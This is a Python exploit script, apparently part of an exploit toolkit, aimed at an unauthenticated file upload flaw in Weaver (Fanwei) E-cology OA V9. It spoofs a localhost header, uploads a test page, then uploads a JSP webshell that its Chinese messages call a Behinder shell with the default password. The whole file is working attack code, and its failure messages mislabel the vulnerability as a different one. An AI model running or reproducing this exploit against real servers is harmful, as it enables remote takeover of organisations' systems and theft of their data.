import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

def Weaver_V9_uploadOperation(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "x-forwarded-for": "127.0.0.1",
    }
    vuln_url = urldata + "page/exportImport/uploadOperation.jsp"
    exp_url = urldata + "page/exportImport/fileTransfer/index123.html"

    file1 = [('file1', ('index123.html', open('./exphub/fanwei/bin/index123.html', 'rb'), 'image/png'))]
    file2 = [('file1', ('index123.jsp', open('./exphub/fanwei/bin/index123.jsp', 'rb'), 'image/png'))]
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.post(vuln_url, headers=headers, files=file1, verify=False)
        cs = requests.get(exp_url, headers=headers, verify=False)
        if cs.status_code == 200 and '123456' in cs.text:
            print(Vcolors.RED + "[+] 测试文件上传成功:{}".format(exp_url) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] 正在尝试GETSHELL".format(exp_url) + Vcolors.ENDC)
            url = requests.post(vuln_url, headers=headers, files=file2, verify=False)
            exp_url = urldata + "page/exportImport/fileTransfer/index123.jsp"
            GS = requests.get(exp_url, headers=headers, verify=False)
            if GS.status_code == 200:
                print(Vcolors.RED + "[+] 冰蝎默认密码文件上传成功:{}".format(exp_url) + Vcolors.ENDC)
            else:
                print(Vcolors.RED + "[x] 上传失败，原因可能存在防火墙请手动上传".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OA_Verify_QuickLogin" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n", e)
        logging.error("泛微OA_Verify_QuickLogin脚本出现异常")

  
        


